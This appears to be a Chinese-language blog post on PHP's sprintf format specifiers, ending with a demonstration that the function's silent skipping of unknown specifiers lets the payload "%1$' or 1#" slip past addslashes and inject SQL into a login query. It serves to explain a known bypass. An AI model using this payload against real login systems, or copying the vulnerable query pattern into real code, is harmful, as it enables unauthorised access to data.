函数定义`sprintf(string $format, mixed ...$values): string`

返回一个根据格式化字符串`format`生成的字符串

```php
<?php
var_dump(sprintf('_%s_','asdf'));
var_dump(sprintf('_%d_',1234));
```

```
string '_asdf_' (length=6)
string '_1234_' (length=6)
```

- 占位符引用

占位符可以重复使用,当使用参数替换时`n$`位置指示符必须紧跟在百分号之后

```php
<?php
var_dump(sprintf('%2$10s,%1$d,%1$d,%2$\'!10s',123,'asdf'));
```

```
string '      asdf,123,123,!!!!!!asdf' (length=29)
```

- 字符串填充

填充方式`%'[要填充的字符][长度]s`

```php
<?php
var_dump(sprintf("_%6s_",'asdf'));
var_dump(sprintf("_% 6s_",'asdf'));
var_dump(sprintf("_%6 s_",'asdf'));
var_dump(sprintf("_%'!10s_",'asdf'));
var_dump(sprintf("_%'@10s_",'asdf'));
var_dump(sprintf("_%''10s_",'asdf'));
var_dump(sprintf("_%10s_",'asdfasdfasdf'));
var_dump(sprintf("_%'!10s_",'asdfasdfasdf'));
```

```
string '_  asdf_' (length=8)
string '_  asdf_' (length=8)
string '_s_' (length=3)
string '_!!!!!!asdf_' (length=12)
string '_@@@@@@asdf_' (length=12)
string '_''''''asdf_' (length=12)
string '_asdfasdfasdf_' (length=14)
string '_asdfasdfasdf_' (length=14)
```

php支持的说明符如下

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202271344428.png)

php对说明符的处理如下,遇到无法识别的说明符直接break

```cpp
switch (*format) {
	case 's': {
		zend_string *t;
		zend_string *str = zval_get_tmp_string(tmp, &t);
		php_sprintf_appendstring(&result, &outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);
		zend_tmp_string_release(t);
		break;
	}

	case 'd':
		php_sprintf_appendint(&result, &outpos, zval_get_long(tmp), width, padding, alignment, always_sign);
		break;

	case 'u':
		php_sprintf_appenduint(&result, &outpos, zval_get_long(tmp), width, padding, alignment);
		break;

	case 'g':
	case 'G':
	case 'e':
	case 'E':
	case 'f':
	case 'F':
		php_sprintf_appenddouble(&result, &outpos,zval_get_double(tmp),width, padding, alignment,precision, adjusting,*format, always_sign);
		break;

	case 'c':
		php_sprintf_appendchar(&result, &outpos,(char) zval_get_long(tmp));
		break;

	case 'o':
		php_sprintf_append2n(&result, &outpos,zval_get_long(tmp),width, padding, alignment, 3,hexchars, expprec);
		break;

	case 'x':
		php_sprintf_append2n(&result, &outpos,zval_get_long(tmp),width, padding, alignment, 4,hexchars, expprec);
		break;

	case 'X':
		php_sprintf_append2n(&result, &outpos,zval_get_long(tmp),width, padding, alignment, 4,HEXCHARS, expprec);
		break;

	case 'b':
		php_sprintf_append2n(&result, &outpos,zval_get_long(tmp),width, padding, alignment, 1,hexchars, expprec);
		break;

	case '%':
		php_sprintf_appendchar(&result, &outpos, '%');
		break;

	case '\0':
		if (!format_len) {
            goto exit;
		}
		break;

	default:
		break;
}
```

对于无法处理的说明符如`%a`和`%1$a`等,直接忽略,处理剩余字符

```php
<?php
var_dump(sprintf('%a','asdf'));
var_dump(sprintf('%1$a','asdf'));
var_dump(sprintf('%1$10a','asdf'));
var_dump(sprintf('%1$as','asdf'));
var_dump(sprintf('%1$a%s','asdf'));
```

```
string '' (length=0)
string '' (length=0)
string '' (length=0)
string 's' (length=1)
string 'asdf' (length=4)
```

- 利用方式

利用无法处理的说明符直接忽略这一特性,可以进行SQL注入

```php
<?php
$db = new mysqli("192.168.1.120", "root", "root", "sql_injection_test");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}

$password = "%1$' or 1#";
var_dump($password);
$password = addslashes($password);
var_dump($password);
$sql = "select * from user where username='%s' and password='$password';";
$username = "admin";
$query=sprintf($sql, $username);

var_dump($query);
$result = $db->query($query);
var_dump($result->fetch_row());
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202271454990.png)